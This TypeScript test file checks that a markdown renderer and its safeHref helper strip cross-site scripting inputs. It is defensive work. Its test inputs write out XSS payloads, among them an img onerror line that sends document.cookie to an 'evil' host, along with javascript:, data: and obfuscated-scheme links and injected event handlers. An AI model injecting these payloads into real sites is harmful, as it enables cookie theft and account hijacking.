import { describe, expect, test } from "bun:test"
import { render, safeHref } from "../src/components/share/markdown"

function sink(html: string) {
  return new DOMParser().parseFromString(html, "text/html").body
}

describe("share markdown sanitization", () => {
  test("empty markdown renders empty", async () => {
    expect(await render("")).toBe("")
  })

  test("img onerror payload is stripped", async () => {
    const html = await render("<img src=x onerror=\"fetch('//evil/?c='+document.cookie)\">")
    expect(html).not.toContain("onerror")
    expect(sink(html).querySelector("[onerror]")).toBeNull()
  })

  test("script tags and contents are removed", async () => {
    const html = await render("before<script>alert(1)</script>after")
    const root = sink(html)
    expect(root.querySelector("script")).toBeNull()
    expect(html).not.toContain("alert(1)")
    expect(root.textContent).toContain("before")
    expect(root.textContent).toContain("after")
  })

  test("iframe is removed", async () => {
    const html = await render('<iframe src="https://evil.com"></iframe>')
    expect(sink(html).querySelector("iframe")).toBeNull()
  })

  test("svg event handlers are stripped", async () => {
    const html = await render('<svg><animate onbegin="alert(1)" attributeName="x"></svg>')
    expect(sink(html).querySelector("[onbegin]")).toBeNull()
  })

  test("javascript: href is removed", async () => {
    const html = await render("[click](javascript:alert(1))")
    expect(html).not.toContain("javascript:")
    const root = sink(html)
    expect(root.querySelector("a")).toBeNull()
    expect(root.textContent).toContain("click")
  })

  test("scheme obfuscation stays inert", async () => {
    const html = await render("[x](javascript&colon;alert(1))")
    expect(html).toContain("javascript&amp;colon;")
    expect(html.toLowerCase()).not.toContain('href="javascript:')
  })

  test("safeHref rejects schemes and control chars", () => {
    expect(safeHref("javascript:alert(1)")).toBeUndefined()
    expect(safeHref("JAVASCRIPT:alert(1)")).toBeUndefined()
    expect(safeHref("data:text/html,<script>alert(1)</script>")).toBeUndefined()
    expect(safeHref("vbscript:msgbox(1)")).toBeUndefined()
    expect(safeHref("mailto:a@b.c")).toBeUndefined()
    expect(safeHref(" java\nscript:alert(1)")).toBeUndefined()
    expect(safeHref("java\tscript:alert(1)")).toBeUndefined()
    expect(safeHref("java\rscript:alert(1)")).toBeUndefined()
    expect(safeHref("")).toBe("")
    expect(safeHref("https://example.com/a?b=1#top")).toBe("https://example.com/a?b=1#top")
    expect(safeHref("HTTP://EXAMPLE.COM")).toBe("HTTP://EXAMPLE.COM")
    expect(safeHref("/docs")).toBe("/docs")
    expect(safeHref("#heading")).toBe("#heading")
    expect(safeHref("?q=1")).toBe("?q=1")
    expect(safeHref("relative.html")).toBe("relative.html")
  })

  test("data: text/html href is removed", async () => {
    const html = await render("[click](data:text/html,<script>alert(1)</script>)")
    const root = sink(html)
    expect(root.querySelector("a")).toBeNull()
    expect(root.querySelector("[href]")).toBeNull()
  })

  test("link title attribute injection is escaped", async () => {
    const html = await render('[x](https://example.com " onmouseover="alert(1)")')
    const a = sink(html).querySelector("a")
    expect(a?.getAttribute("onmouseover")).toBeNull()
    expect(a?.getAttribute("href")).toBe("https://example.com")
  })

  test("html in link text is not executable", async () => {
    const html = await render("[<img src=x onerror=alert(1)>](https://example.com)")
    expect(html).not.toContain("onerror")
    const root = sink(html)
    expect(root.querySelector("[onerror]")).toBeNull()
    expect(root.querySelector("a")?.getAttribute("href")).toBe("https://example.com")
  })

  test("https links keep href, target and rel", async () => {
    const html = await render("[click](https://example.com/a?b=1)")
    const a = sink(html).querySelector("a")
    expect(a?.getAttribute("href")).toBe("https://example.com/a?b=1")
    expect(a?.getAttribute("target")).toBe("_blank")
    expect(a?.getAttribute("rel")).toBe("noopener noreferrer")
  })

  test("relative and anchor hrefs are preserved", async () => {
    const root = sink(await render("[docs](/docs) and [skip](#heading) and [q](?x=1)"))
    const hrefs = Array.from(root.querySelectorAll("a")).map((a) => a.getAttribute("href"))
    expect(hrefs).toEqual(["/docs", "#heading", "?x=1"])
  })

  test("non-http scheme href is dropped", async () => {
    const html = await render("[mail](mailto:a@b.c)")
    const root = sink(html)
    expect(root.querySelector("a")).toBeNull()
    expect(root.textContent).toContain("mail")
  })

  test("shiki code blocks survive sanitization", async () => {
    const html = await render("```ts\nconst x = 1\n```")
    expect(html).toContain("<pre")
    expect(html).toContain("shiki")
    expect(sink(html).querySelector("code")?.textContent).toContain("const x = 1")
  })

  test("script inside code fence stays visible text", async () => {
    const html = await render("```\n<script>alert(1)</script>\n```")
    const root = sink(html)
    expect(root.querySelector("script")).toBeNull()
    expect(root.querySelector("pre")?.textContent).toContain("alert(1)")
  })

  test("markdown formatting is preserved", async () => {
    const html = await render("# Title\n\n**bold** and *em*")
    const root = sink(html)
    expect(root.querySelector("h1")?.textContent).toContain("Title")
    expect(root.querySelector("strong")).toBeTruthy()
    expect(root.querySelector("em")).toBeTruthy()
  })
})
